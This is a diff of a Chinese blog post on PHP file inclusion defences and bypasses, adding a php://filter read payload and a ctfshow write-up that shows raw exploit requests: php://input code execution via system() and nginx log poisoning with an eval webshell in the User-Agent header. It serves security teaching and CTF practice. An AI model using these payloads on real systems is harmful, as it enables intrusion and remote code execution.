@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.4k</span>
+            <span class="post-count">3.8k</span>
         </span>
     </span>
 
@@ -104,7 +104,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">12 分钟</span>
+            <span class="post-count">14 分钟</span>
         </span>
     </span>
 </div>
@@ -157,6 +157,7 @@
 <h2 id="防护手段及对应的绕过方式"><a href="#防护手段及对应的绕过方式" class="headerlink" title="防护手段及对应的绕过方式"></a>防护手段及对应的绕过方式</h2><p>文件包含漏洞在攻击方面会有两个关注点：<strong>包含目标文件内容合法性</strong>以及<strong>包含文件的路径</strong>。</p>
 <p>针对<strong>文件内容合法性</strong>，更多的是要在<strong>各类上传及文件接口</strong>上做好对应的防护。</p>
 <p>在文件包含漏洞的防护方面，更多的是针对包含文件的<strong>过程</strong>进行防护，防护手段主要分为<strong>对包含目标的参数过滤</strong>和<strong>中间件级安全配置</strong>两个方面。</p>
+<p><code>php://filter/convert.base64-encode/resource=index</code></p>
 <h3 id="1-文件名验证"><a href="#1-文件名验证" class="headerlink" title="1.文件名验证"></a>1.文件名验证</h3><p>包含文件验证是指对可包含文件名设置黑名单或白名单、文件后缀名固定等，效果非常类似于文件上传攻击中针对文件后缀名的防护方式，比如只允许后缀为jpg的文件包含等。针对文件名的防护方式思路非常清晰，即严格限定文件类型。</p>
 <p>采取的方法主要为：</p>
 <p>1）文件后缀名固定：在包含的文件名后加固定后缀，期望文件按预期目标解析。</p>
@@ -214,6 +215,31 @@
 <p>主要思路是限制当前中间件所在用户的权限。推荐给Web服务器配置独立用户，只拥有访问本目录及使用中间件的权限，从而有效避免越权访问其他的文件。</p>
 </blockquote>
 <h4 id="绕过方式-2"><a href="#绕过方式-2" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>通过软链接指向允许范围外的文件（需服务器已有软连接配置），实现文件包含。</p>
+<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="1-web3"><a href="#1-web3" class="headerlink" title="1.web3"></a>1.web3</h3><p>页面就给一个代码 <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code></p>
+<h4 id="抓包-php伪协议"><a href="#抓包-php伪协议" class="headerlink" title="抓包+php伪协议"></a>抓包+php伪协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=php://input HTTP/1.1</span><br><span class="line">Host: 71ebeb35-9940-4deb-bd09-9621a4cca6b6.challenge.ctf.show</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 23</span><br><span class="line"></span><br><span class="line">&lt;?php system(&quot;pwd&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>HTTP&#x2F;1.1 200 OK<br>Server: nginx&#x2F;1.18.0 (Ubuntu)<br>Date: Mon, 26 Jun 2023 05:56:07 GMT<br>Content-Type: text&#x2F;html; charset&#x3D;UTF-8<br>Connection: close<br>X-Powered-By: PHP&#x2F;7.3.11<br>Content-Length: 717</p>
+<p><strong>&#x2F;var&#x2F;www&#x2F;html</strong><br>&lt;html…..</p>
+</blockquote>
+<p>如果将请求内容改为ls</p>
+<p><code>&lt;?php system(&quot;ls&quot;)?&gt;</code></p>
+<blockquote>
+<p>ctf_go_go_go<br>index.php<br>&lt;html lang&#x3D;”zh-CN”&gt;</p>
+</blockquote>
+<p><code>&lt;?php system(&quot;cat ctf_go_go_go&quot;)?&gt;</code>即可</p>
+<h3 id="2-web4"><a href="#2-web4" class="headerlink" title="2.web4"></a>2.web4</h3><p>同样的代码，但是伪协议失效了</p>
+<p>尝试直接日志路径&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>发现日志会写进UA头，可以尝试一句话木马，蚁剑连接即可</p>
+<blockquote>
+<p>…</p>
+<p>2023:06:04:58 +0000] “GET &#x2F; HTTP&#x2F;1.1” 200 715 “-“ “Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;112.0.0.0 Safari&#x2F;537.36”</p>
+<p>…</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=/var/log/nginx/access.log HTTP/1.1</span><br><span class="line">Host: ed85081d-b185-4ad0-8563-5676806fe548.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>针对文件包含攻击，标准的防护手段及可实现的绕过方式有以下几种：</p>
 <p>1）尽可能保持中间件及PHP版本最新，从而有效避免低版本中存在大量利用%00、..&#x2F;..&#x2F;、点号截断的情况。</p>
 <p>2）利用配置文件中的目录限制功能对用户可访问的目录进行限制。</p>
